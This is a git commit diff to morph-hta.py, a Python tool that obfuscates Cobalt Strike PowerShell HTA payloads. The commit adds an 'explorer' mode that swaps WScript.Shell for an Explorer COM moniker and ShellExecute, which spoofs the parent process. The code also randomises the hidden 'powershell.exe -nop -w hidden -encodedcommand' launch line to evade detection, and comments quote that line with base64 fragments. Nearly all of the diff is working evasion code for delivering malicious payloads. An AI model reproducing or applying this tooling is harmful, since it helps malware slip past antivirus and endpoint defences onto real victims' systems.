be36654fca22db50525188209e438c1318ae2b3c
Vincent Yiu <vincent.yiu@internal.mdsec.co.uk>
2017-09-03 20:52:59 +0100

    Fixed previous bug with not choosing binary paths correctly. Also now added new method default to use explorer parent spawning

--- morph-hta.py
+++ morph-hta.py
@@ -117,6 +117,7 @@ class morphHTA(object):
 		parser = argparse.ArgumentParser(description = "")
 		parser.add_argument("--in", metavar="<input_file>", dest = "infile", default = "evil.hta", help = "File to input Cobalt Strike PowerShell HTA")
 		parser.add_argument("--out", metavar="<output_file>", dest = "out", default = "morph.hta", help = "File to output the morphed HTA to")
+		parser.add_argument("--mode", metavar="<default: explorer>", dest = "mode", default = "explorer", help = "Technique to use: MSHTA, Explorer, WmiPrvSE")
 		parser.add_argument("--maxstrlen", metavar="<default: 1000>", dest = "maxstrlen", default = 1000, help = "Max length of randomly generated strings")
 		parser.add_argument("--maxvarlen", metavar="<default: 40>", dest = "maxvarlen", default = 40, help = "Max length of randomly generated variable names")
 		parser.add_argument("--maxnumsplit", metavar="<default: 10>", dest = "maxnumsplit", default = 10, help = "Max number of times values should be split in chr obfuscation")
@@ -132,12 +133,19 @@ class morphHTA(object):
 		else:
 			a = open(self.args.infile, 'r')
 			bScript = False
+			bPS = False
 			for line in a.readlines():
 				if "script language" in line.lower():
 					bScript = True
+				if "powershell" in line.lower():
+					bPS = True
 
-			if not bScript:
+			if not (bScript and bPS):
 				sys.exit("\033[1;31m[*] HTA does not include a script, invalid Cobalt Strike PowerShell HTA file\033[0;0m")
+
+		if not (self.args.mode.lower() in ["mshta", "explorer", "wmiprvse"]):
+			sys.exit("\033[1;31m[*] Invalid Mode. Select one of mshta, explorer or wmiprvse\033[0;0m")	
+
 
 	def run(self, args):
 
@@ -173,12 +181,41 @@ class morphHTA(object):
 		temp = []
 
 		for line in lines:
+			if "var_shell.run" in line:
+				if self.args.mode.lower() == "explorer":
+					# Replace run command
+					#print "Replacing 1"
+					line = line.replace("var_shell.run", "var_shell.Document.Application.ShellExecute")
+					#print line
+
+			if "powershell.exe -nop -w hidden -encodedcommand" in line:
+				if self.args.mode.lower() == "explorer":
+					#print "Replacing 2"
+					# Replace command and split from "powershell.exe -nop -w hidden -encodedcommand" to "powershell.exe", "-nop -w hidden -encodedcommand"
+					line = line.replace("\"powershell.exe -nop -w hidden -encodedcommand", "\"powershell.exe\",\"-nop -w hidden -encodedcommand")
+					line = line.replace("\", 0, true", "\",\"\",Null,0")
+					#print line
+					# Good
+
+					
 			if "var_shell" in line:
 				# if we find var_shell
 				line = line.replace("var_shell", newshell)
+
 			if "var_func" in line:
 				# if we find var_func
 				line = line.replace("var_func", newfunc)
+
+			if "CreateObject(\"Wscript.Shell\")" in line:
+				# If we find WScript.Shell, we want to replace it for the Explorer moniker new:C08AFD90-F2A1-11D1-8455-00A0C91F3880 or other
+				if self.args.mode.lower() == "explorer":
+					# Replace the moniker, still need to replace the call object
+					#print "Replacing 3"
+					line = line.replace("CreateObject(\"Wscript.Shell\")", "GetObject(\"new:C08AFD90-F2A1-11D1-8455-00A0C91F3880\")")
+					#print line
+
+
+
 			temp += [line]
 
 		lines = temp
@@ -197,7 +234,7 @@ class morphHTA(object):
 				else:
 					# keep the base64 intact
 					# This is the powershell line
-					# Ojkq9Lwk8HMCNXIEErlP4Gh.run "powershell.exe -nop -w hidden -encodedcommand JAB7ADEAMAAxADEAMQ", 0, true
+					# Ojkq9Lwk8HMCNXIEErlP4Gh.run "powershell.exe -nop -w hidden -encodedcommand JAB7ADEAMAAxADEAMQAApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA", 0, true
 					# We cannot morph .run
 					# We cannot change powershell.exe but we can change the path and extension to nothing
 					# eg. powershell.exe
@@ -213,10 +250,16 @@ class morphHTA(object):
 
 
 					# line0 contains Ojkq9Lwk8HMCNXIEErlP4Gh.run 
+
 					line0 = line.split("\"")[0]
 
-					# line1 contains powershell.exe -nop -w hidden -encodedcommand JAB7ADEAMAAxADEAMQ
-					line1 = line.split("\"")[1]
+					# line1 contains powershell.exe -nop -w hidden -encodedcommand JAB7ADEAMAAxADEAMQAApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA
+					# line1 can also contain just powershell.exe, do we want to add the rest back on? Let's do it
+					if self.args.mode == "explorer":
+						line1 = line.split("\"")[1] + "\"" + line.split("\"")[2] + "\"" + line.split("\"")[3]
+					elif self.args.mode == "mshta":
+						line1 = line.split("\"")[1]
+				
 
 					# This mutates the powershell.exe starting line
 					psRep = ""
@@ -244,6 +287,7 @@ class morphHTA(object):
 						psRep = psRep + ".exe"
 					
 
+					#print psRep
 					###########
 
 					# Flip the \ with /'s randomly if there's any
@@ -254,17 +298,16 @@ class morphHTA(object):
 						if self.randbool():
 							# 50% chance
 							# Set to \
-							psRep = psItem + "\\"
+							psRep += psItem + "\\"
 						else:
 							# 50% chance
 							# Set to /
-							psRep = psItem + "/"
+							psRep += psItem + "/"
 
 					# Now we have too many slashes, so let's kick off the last one
 
 					psRep = psRep[:len(psRep)-1] 
-
-
+					
 					###########
 
 					line1 = line1.replace("powershell.exe", psRep)
@@ -277,15 +320,26 @@ class morphHTA(object):
 					line1 = line1.replace("-w hidden", "-" + self.winDict[random.randint(0, len(self.winDict)-1)] + " " + self.hidDict[random.randint(0, len(self.hidDict)-1)])
 
 
-					# line11 contains powershell.exe -nop -w hidden -
+					# line1 can be 		var_shell.Document.Application.ShellExecute "powershell.exe","-nop -w hidden -					encodedcommand JAB7ADKAApADsA","",Null,0
+					# or line1 can be 	var_shell.run "powershell.exe -nop -w hidden -													encodedcommand JAB7AAKAApADsA", 0, true
+
+					# line11 contains 			powershell.exe -nop -w hidden - 
+					# line11 can also contain var_shell.Document.Application.ShellExecute "powershell.exe","-nop -w hidden -
+					#print line1
+
 					line11 = line1.split("encodedcommand ")[0]
 
-					# critical contains JAB7ADEAMAAxADEAMQAApAC4AUgBlAGEAZABUAG8ARQ
+					# critical contains JAB7ADEAMAAxADEAMQAApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA
 					critical = line1.split("encodedcommand ")[1]
-
 					
 					# line2 contains , 0, true
-					line2 = line.split("\"")[2]
+
+					if self.args.mode == "explorer":
+						line2 = line.split("\"")[4] + "\"" + line.split("\"")[5] + "\"" + line.split("\"")[6]
+					elif self.args.mode == "mshta":
+						line2 = line.split("\"")[2]
+
+					#print line2
 
 					# print line0 + line11 + "encodedcommand " +  critical + line2
 
@@ -297,8 +351,30 @@ class morphHTA(object):
 
 					# line = self.obfuscate(line0) + self.obfuscate(self.obfuscateNum(self.obfuscate(line11 + "encodedcommand ")) + "&") + self.obfuscateNum(critical) + self.obfuscate(line2)
 
-					print line0 + line11 + ecFill + " " + critical + line2
-					line = self.obfuscate(line0) + self.obfuscate(self.obfuscateNum(self.obfuscate(line11 + ecFill + " ")) + "&") + self.obfuscateNum(critical) + self.obfuscate(line2)
+
+					if self.args.mode == "explorer":
+						line11 = "\"" + line11
+						line2 = line2.replace(",\"\",Null,0", ",\"\",Null,0")
+					#print line2
+					
+					#print line0 + line11 + ecFill + " " + critical + line2
+
+					if self.args.mode == "mshta":
+						line = self.obfuscate(line0) + self.obfuscate(self.obfuscateNum(self.obfuscate(line11 + ecFill + " ")) + "&") + self.obfuscateNum(critical) + self.obfuscate(line2)
+					elif self.args.mode == "explorer":
+
+						cmd = line11.split("\"")[1]
+
+						red = (line11 + ecFill + " ")# + critical
+						param = (red.split("\"")[3])
+
+						#print "R1: %s" % (red.split("\"")[1])	# powershell bit
+						#print "R3: %s" % (red.split("\"")[3])	# parameter bit
+						print "Param: %s" % param
+
+						print self.obfuscate(line0) + self.obfuscateNum(self.obfuscate(cmd)) + "," + (self.obfuscateNum(self.obfuscate(param) + critical)) + self.obfuscate(line2)
+
+						line = self.obfuscate(line0) + self.obfuscateNum(self.obfuscate(cmd)) + "," + (self.obfuscateNum(self.obfuscate(param) + critical)) + self.obfuscate(line2)
 
 			else:
 				line = self.obfuscate(line)
